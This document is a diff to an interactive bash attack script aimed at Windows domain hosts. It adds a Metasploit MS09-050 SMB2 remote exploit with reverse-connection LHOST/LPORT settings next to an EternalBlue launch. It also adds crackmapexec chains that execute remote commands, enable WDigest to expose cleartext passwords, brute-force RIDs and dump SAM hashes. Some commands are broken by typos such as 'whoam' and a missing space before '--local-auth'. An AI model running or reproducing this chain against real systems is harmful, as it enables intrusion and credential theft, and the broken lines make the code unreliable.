@@ -34,12 +34,6 @@ read PASS
 echo -e '\E[31;40m' "User File"; tput sgr0
 read USERFILE
 
-else
-	echo ""
-fi
-echo ""
-echo ""
-
 if grep https://nmap.org $DOMAINIP.txt
 then
 	echo -e '\E[31;40m' "$DOMAINIP.txt already exists, not running NMAP scan";tput sgr0
@@ -78,10 +72,12 @@ echo "
 3)  Kerberoasting / Kerbrute you pick
 4)  ZeroLogon 
 5)  PrintNightmare
-6)  Run bloodhound-python (needs to be installed, if not installed run Download Tools first)
-7)  EternalBlue (like OMG... that still exists...)
-8)  SecretsDump (Need Username and Password)
+6)  Run bloodhound-python 
+7)  EternalBlue 
+8)MS09-050 
+9)  SecretsDump (Need Username and Password)
 n)  Listen to some NIN
+c)  Crackmapexec (Need Username and Password)
 z)  Run the whole script (Will do the above and much more)
 99) exit
 "
@@ -201,6 +197,33 @@ elif [ $answer = 3 ]; then
 			echo -e '\E[31;35m' "Not an answer or you spelled something wrong"; tput sgr0
 		fi
 	fi	
+elif [ $answer = c ]; then
+	read -p "What would you like to attack (smb, ldap, ssh, winrm, mssql (ex: ldap) or (ex: smb): " answer
+	echo -e '\E[31;35m' "Trying Command Injection with whoami"
+	crackmapexec $answer $DOMAINIP  -u $USER  -p $PASS -x whoami 
+	wait -n
+	echo -e '\E[31;35m' "Trying PowerShell Injection with whoami"
+	crackmapexec $answer $DOMAINIP -u $USER -p $PASS -x whoami  
+	wait -n
+	echo -e '\E[31;35m' "Checking for logged in users" 
+	crackmapexec $answer $DOMAINIP -u $USER -p $PASS--local-auth
+	wait -n
+	echo -e '\E[31;35m' "Trying to enumerate shares" 
+	crackmapexec $answer $DOMAINIP -u  $USER  -p $PASS --local-auth --shares  
+	wait -n
+	echo -e '\E[31;35m' "Trying to enable WDigest for LSA password dump in clear text" 
+	crackmapexec $answer $DOMAINIP -u $USER -p $PASS --local-auth --wdigest enable 
+	wait -n
+	echo -e '\E[31;35m' "Checking password policy"  
+	crackmapexec $answer $DOMAINIP -u $USER -p $PASS --local-auth --pass-pol
+	wait -n
+	echo -e '\E[31;35m' "RID Brute Forcing"  
+	crackmapexec $answer $DOMAINIP -u $USER -p $PASS --rid-brute
+	wait -n
+	echo -e '\E[31;35m' "Trying to dump local SAM hashes"  
+	crackmapexec $answer $DOMAINIP -u $USER -p $PASS --local-auth --sam
+	wait -n
+
 elif [ $answer = 4 ]; then
 	echo -e '\E[31;40m' "Testing if vulnerable to Zero Logon (this may take some time)"; tput sgr0
 	echo -e '\E[31;40m' "If you get an error, and it states it is vulnerable it is ok"; tput sgr0
@@ -270,7 +293,13 @@ elif [ $answer = 7 ]; then
 			msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
 		fi
 	fi
-elif [ $answer = 8 ] && [ $USER ] && [ $PASS ] && [ $DOMAIN ] ; then
+elif [ $answer = 8 ]; then
+	echo "LHOST?"
+	read LHOST
+	echo "LPORT?"
+	read LPORT
+	msfconsole -x "use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
+elif [ $answer = 9 ] && [ $USER ] && [ $PASS ] && [ $DOMAIN ] ; then
 	echo -e '\E[31;35m' "Saving everything to secretsdump.txt"; tput sgr0
 	secretsdump.py "$DOMAIN/$USER:$PASS"@$DOMAINIP > secretsdump.txt
 	hash=$(cat secretsdump.txt | sed '6q;d' | cut -d ':' -f 3,4)
@@ -368,36 +397,6 @@ elif [ $answer = z ]; then
 	
 	if [ $USER ] && [ $PASS ]
 	then
-		read -p "Since you provided a Username and Password would you like to try some crackmapexec stuff? (y/n)" answer
-		if [ $answer = y ] ; then
-			read -p "What would you like to attack (smb, ldap, ssh, winrm, mmsql (ex: ldap) or (ex: smb)" answer
-			echo -e '\E[31;35m' "Trying Command Injection with whoami"; tput sgr0
-			crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' -x whoami >> $DOMAINIP.txt
-			echo -e '\E[31;35m' "Trying PowerShell Injection with whoami"; tput sgr0
-			crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' -X whoami >> $DOMAINIP.txt
-			echo -e '\E[31;35m' "Checking for logged in users" ; tput sgr0
-			crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth >> $DOMAINIP.txt
-			echo -e '\E[31;35m' "Trying to enumerate shares" ; tput sgr0
-			crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth --shares >> $DOMAINIP.txt
-			echo -e '\E[31;35m' "Trying to enable WDigest for LSA password dump in clear text" ; tput sgr0
-			crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth --wdigest enable >> $DOMAINIP.txt
-			echo -e '\E[31;35m' "Checking password policy" ; tput sgr0 
-			crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth --pass-pol >> $DOMAINIP.txt
-			echo -e '\E[31;35m' "RID Brute Forcing" ; tput sgr0 
-			crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --rid-brute >> $DOMAINIP.txt
-			echo -e '\E[31;35m' "Trying to dump local SAM hashes" ; tput sgr0 
-			crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth --sam >> $DOMAINIP.txt
-		elif [ $answer = n ] ; then
-			echo -e '\E[31;35m' "Continuing Script"; tput sgr0
-		else 
-			echo ""
-		fi
-	else
-		echo ""
-	fi
-	
-	if [ $USER ] && [ $PASS ]
-	then
 		read -p "Since you provided username and password would like to try ldapdomaindump? (y/n)" answer
 		if [ $answer = y ] ; then
 			echo "Making $DOMAINIP.ldap directory"
@@ -412,7 +411,7 @@ elif [ $answer = z ]; then
 	else 
 			echo "Continuing Script"
 	fi
-	
+
 	if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
 	then
 		echo -e '\E[31;35m' "Getting Users SPNs if we can"; tput sgr0
@@ -808,17 +807,43 @@ elif [ $answer = z ]; then
 		echo -e '\E[31;40m' "Not running SMB Killer";tput sgr0
 	fi
 	
-	read -p "Do you want to open a new tab for responder? (y/n):" answer
+	read -p "Do you want to open a new tab for responder? (y/n): " answer
 	if [ $answer = y ] ; then
-		echo -e '\E[31;40m' "Interface to run responder on ex: (eth1)?"; tput sgr0 
+		echo -e '\E[31;40m' "Interface to run responder on ex: (eth1)? "; tput sgr0 
 		read INT
 		terminator --new-tab -e "sudo responder -I $INT -rdwv;bash"
-	else
-		""
 	fi
 	
 	# if you actually read this, then good job, if you just ran it... shame on you, know what something is doing before you do anything, good thing
 	# nothing malicious is happening to your own system!!! READ THE DAMN SCRIPTS ON GITHUB!!!
-else 
-	echo "Not an answer"
+	if [ $USER ] && [ $PASS ]; then
+		read -p "Since you provided a Username and Password would you like to try some crackmapexec stuff? (y/n): " answer
+		if [ $answer = y ] ; then
+			read -p "What would you like to attack (smb, ldap, ssh, winrm, mssql (ex: ldap) or (ex: smb): " answer
+			echo -e '\E[31;35m' "Trying Command Injection with whoami"
+			crackmapexec $answer $DOMAINIP  -u $USER  -p $PASS -x whoami 
+			wait -n
+			echo -e '\E[31;35m' "Trying PowerShell Injection with whoami"
+			crackmapexec $answer $DOMAINIP -u $USER -p $PASS -x whoam  
+			wait -n
+			echo -e '\E[31;35m' "Checking for logged in users" 
+			crackmapexec $answer $DOMAINIP -u $USER -p $PASS--local-auth
+			wait -n
+			echo -e '\E[31;35m' "Trying to enumerate shares" 
+			crackmapexec $answer $DOMAINIP -u  $USER  -p $PASS --local-auth --shares  
+			wait -n
+			echo -e '\E[31;35m' "Trying to enable WDigest for LSA password dump in clear text" 
+			crackmapexec $answer $DOMAINIP -u $USER -p $PASS --local-auth --wdigest enable 
+			wait -n
+			echo -e '\E[31;35m' "Checking password policy"  
+			crackmapexec $answer $DOMAINIP -u $USER -p $PASS --local-auth --pass-pol
+			wait -n
+			echo -e '\E[31;35m' "RID Brute Forcing"  
+			crackmapexec $answer $DOMAINIP -u $USER -p $PASS --rid-brute
+			wait -n
+			echo -e '\E[31;35m' "Trying to dump local SAM hashes"  
+			crackmapexec $answer $DOMAINIP -u $USER -p $PASS --local-auth --sam
+			wait -n
+		fi
+	fi
 fi
